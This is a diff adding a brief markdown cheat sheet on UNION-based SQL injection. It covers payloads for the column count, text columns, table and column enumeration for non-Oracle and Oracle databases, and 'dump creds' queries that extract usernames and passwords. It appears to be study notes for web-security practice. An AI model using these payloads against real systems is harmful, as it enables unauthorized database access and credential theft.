@@ -1,0 +1,36 @@
+## SQLi UNION — Listing DB contents (Non-Oracle vs Oracle)
+
+###  Common steps
+
+* Find **column count**:
+  `' ORDER BY 1-- -`
+* Test UNION:
+  `' UNION SELECT NULL,NULL-- -`
+* Find **text column(s)**:
+  `' UNION SELECT 'a','b'-- -`
+
+###  Non-Oracle (PostgreSQL / MySQL )
+
+* Tables:
+  `information_schema.tables`
+* Columns:
+  `information_schema.columns`
+* Get table names:
+  `' UNION SELECT table_name,NULL FROM information_schema.tables-- -`
+* Get column names:
+  `' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users_xxx'-- -`
+* Dump creds:
+  `' UNION SELECT username_xxx,password_yyy FROM users_xxx-- -`
+
+### Oracle
+
+* Tables:
+  `all_tables`
+* Columns:
+  `all_tab_columns` 
+* Get table names:
+  `' UNION SELECT table_name,NULL FROM all_tables-- -`
+* Get column names:
+  `' UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name='USERS_XXX'-- -`
+* Dump creds:
+  `' UNION SELECT USERNAME_XXX,PASSWORD_YYY FROM USERS_XXX-- -`
